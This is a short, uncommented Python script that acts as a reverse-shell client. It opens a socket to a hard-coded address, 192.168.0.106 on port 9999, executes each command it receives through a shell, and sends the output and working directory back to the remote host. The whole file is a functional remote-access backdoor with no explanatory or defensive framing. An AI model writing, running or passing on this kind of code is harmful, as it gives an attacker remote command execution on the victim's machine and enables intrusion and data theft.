import os
import subprocess
import socket

s=socket.socket()
host='192.168.0.106'
port = 9999

s.connect((host,port))

while (True):
    data = s.recv(4096)
    
    if(data[:2].decode()=="cd"):
        try:
            os.chdir(data[3:].decode("utf-8"))
        except:
            s.send(str.encode("No Such Directory"))
    
    if(len(data)>0):
        command=subprocess.Popen(data[:].decode('utf-8'), shell= True , stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin = subprocess.PIPE)
        foo = command.stdout.read()+ command.stderr.read()  
        response = str(foo,'utf-8')
        s.send(str.encode(response + str(os.getcwd())))
        print(response)

s.close()